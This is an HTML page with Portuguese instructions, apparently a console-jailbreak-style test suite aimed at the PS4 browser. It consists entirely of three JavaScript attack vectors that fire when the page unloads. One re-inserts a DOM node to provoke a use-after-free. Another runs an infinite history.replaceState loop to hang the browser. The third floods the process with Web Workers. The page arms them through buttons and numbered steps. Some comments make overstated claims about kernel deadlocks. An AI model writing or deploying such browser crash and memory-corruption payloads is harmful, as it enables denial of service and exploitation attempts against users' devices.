<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v420000: The Death Rattle</title>
<style>
    body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #f00; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #200; color: #fff; font-weight: bold;
    }
    .instruction { color: #ff0; font-size: 0.9em; margin-bottom: 10px; }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #500; color: #fff; border: 2px solid #f00;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #f00; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v420000: THE DEATH RATTLE</h1>

<div class="status" id="status-box">
    PASSO A PASSO CRÍTICO:<br>
    1. CLIQUE NO BOTÃO.<br>
    2. ATIVE FULLSCREEN (QUADRADO).<br>
    3. FECHE O ALERTA.<br>
    4. ⚠️ APERTE "ATUALIZAR" (REFRESH) NO CONTROLE! ⚠️
</div>

<div class="instruction">O ataque só acontece quando a página tenta fechar.</div>

<button onclick="rattle(d01)">01. DOM Resurrection (Object UAF)</button>

<button onclick="rattle(d02)">02. History State Deadlock (Kernel Hang)</button>

<button onclick="rattle(d03)">03. Worker Orphan Bomb (Process Kill)</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Armazém global
    let zombieNode = null;

    // =================================================================
    // EXECUTOR RATTLE
    // =================================================================
    function rattle(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Prepara a Armadilha
        vectorFunc(Stage);
        
        // 2. Fullscreen (Para engajar GPU e Buffer de Vídeo)
        if (Stage.webkitRequestFullscreen) Stage.webkitRequestFullscreen();
        else if (Stage.requestFullscreen) Stage.requestFullscreen();

        // 3. Alerta de Instrução
        setTimeout(() => {
            window.alert("⚠️ PREPARADO ⚠️\n\nAgora a armadilha está armada.\n\nAPERTE O BOTÃO 'ATUALIZAR' (Refresh) NO SEU CONTROLE PARA DISPARAR.");
            
            // Indicação Visual
            document.body.style.background = "#200";
            Stage.innerHTML = "AGUARDANDO REFRESH...";
        }, 100);
    }

    // =================================================================
    // 01. DOM Resurrection (Object UAF)
    // Tenta trazer um elemento de volta à vida enquanto o navegador
    // está deletando a árvore DOM.
    // =================================================================
    function d01(stage) {
        // Cria um elemento complexo
        zombieNode = document.createElement('div');
        zombieNode.innerText = "ZOMBIE";
        for(let i=0; i<100; i++) zombieNode.appendChild(document.createElement('span'));
        stage.appendChild(zombieNode);

        // O GOLPE: Executa no evento 'unload' (Refresh)
        window.onunload = function() {
            // O navegador já começou a destruir o 'stage'.
            // Tentamos reinserir o 'zombieNode' (que deveria ser destruído) de volta no body.
            // Isso cria um conflito de gerenciamento de memória.
            try {
                document.body.appendChild(zombieNode);
                
                // Loop de acesso para garantir que o renderizador tente ler o objeto
                const start = Date.now();
                while(Date.now() - start < 1000) {
                    zombieNode.innerText = "ALIVE " + Math.random();
                }
            } catch(e) {}
        };
        
        // BeforeUnload também para garantir
        window.onbeforeunload = function() {
            return "Travando...";
        };
    }

    // =================================================================
    // 02. History State Deadlock (Kernel Hang)
    // Tenta salvar estado no histórico ENQUANTO o histórico está sendo destruído.
    // Isso ataca diretamente o processo Pai do navegador.
    // =================================================================
    function d02(stage) {
        stage.innerText = "HISTORY TRAP";

        // Preenche o histórico primeiro
        for(let i=0; i<50; i++) history.pushState({}, "", "#p"+i);

        // O GOLPE: Executa no evento 'pagehide'
        window.onpagehide = function() {
            // Entra num loop infinito síncrono DENTRO do evento de fechamento
            // Tentando escrever no disco/memória via History API
            while(true) {
                history.replaceState(null, "", "#deadlock");
                // Tenta forçar comunicação síncrona com o Kernel
                // Se o Kernel estiver esperando a aba fechar, isso causa Deadlock.
            }
        };
    }

    // =================================================================
    // 03. Worker Orphan Bomb (Process Kill)
    // Cria Workers que se recusam a morrer e bombardeiam o processo principal
    // durante o desligamento.
    // =================================================================
    function d03(stage) {
        stage.innerText = "WORKER TRAP";

        // Código do Worker: Grita infinitamente
        const blob = new Blob([`
            setInterval(() => { postMessage("DONT_KILL_ME"); }, 0);
        `], {type: 'text/javascript'});
        
        const workers = [];
        for(let i=0; i<10; i++) {
            workers.push(new Worker(URL.createObjectURL(blob)));
        }

        // O GOLPE: No fechamento da página...
        window.onunload = function() {
            // Em vez de terminar os workers, criamos MAIS workers
            // num loop bloqueante
            const start = Date.now();
            while(Date.now() - start < 2000) { // Tenta segurar por 2 segundos
                workers.push(new Worker(URL.createObjectURL(blob)));
            }
            // O navegador vai tentar matar o processo forçadamente após timeout
            // Mas a fila de criação de threads estará cheia.
        };
    }

</script>
</body>
</html>
